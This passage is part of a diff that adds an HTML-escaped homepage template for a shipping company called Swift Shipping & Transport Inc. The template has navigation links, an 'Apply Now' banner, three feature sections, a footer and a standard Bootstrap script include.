+                        &lt;a class=&quot;nav-link&quot; href=&quot;/about&quot;&gt;About Us&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;/application&quot;&gt;Application Form&lt;/a&gt;
+                    &lt;/li&gt;
+                &lt;/ul&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+    &lt;div class=&quot;container mt-5&quot;&gt;
+        
+    &lt;div class=&quot;jumbotron text-center text-white py-5 position-relative&quot;&gt;
+        &lt;div class=&quot;overlay&quot;&gt;&lt;/div&gt;
+        &lt;div class=&quot;content position-relative&quot;&gt;
+            &lt;h1 class=&quot;display-4&quot;&gt;Welcome to Swift Shipping &amp; Transport Inc.&lt;/h1&gt;
+            &lt;p class=&quot;lead&quot;&gt;Your trusted partner in logistics and transportation.&lt;/p&gt;
+            &lt;a class=&quot;btn btn-light btn-lg&quot; href=&quot;/application&quot; role=&quot;button&quot;&gt;Apply Now&lt;/a&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+    &lt;div class=&quot;row mt-5&quot;&gt;
+        &lt;div class=&quot;col-md-4&quot;&gt;
+            &lt;img src=&quot;/static/images/featured1.jpg&quot; class=&quot;img-fluid rounded&quot; alt=&quot;Fleet Image&quot;&gt;
+            &lt;h3 class=&quot;mt-3&quot;&gt;Our Fleet&lt;/h3&gt;
+            &lt;p&gt;Explore our state-of-the-art fleet of trucks and vehicles.&lt;/p&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;col-md-4&quot;&gt;
+            &lt;img src=&quot;/static/images/featured2.jpg&quot; class=&quot;img-fluid rounded&quot; alt=&quot;Drivers Image&quot;&gt;
+            &lt;h3 class=&quot;mt-3&quot;&gt;Our Drivers&lt;/h3&gt;
+            &lt;p&gt;Meet our team of professional and dedicated drivers.&lt;/p&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;col-md-4&quot;&gt;
+            &lt;img src=&quot;/static/images/featured3.jpg&quot; class=&quot;img-fluid rounded&quot; alt=&quot;Safety Image&quot;&gt;
+            &lt;h3 class=&quot;mt-3&quot;&gt;Safety First&lt;/h3&gt;
+            &lt;p&gt;Learn about our commitment to safety on the road.&lt;/p&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;/div&gt;
+    &lt;footer class=&quot;bg-dark text-white text-center py-3 mt-5&quot;&gt;
+        &lt;p&gt;© 2024 Swift Shipping &amp; Transport Inc. All rights reserved.&lt;/p&gt;
+    &lt;/footer&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+</body></html>
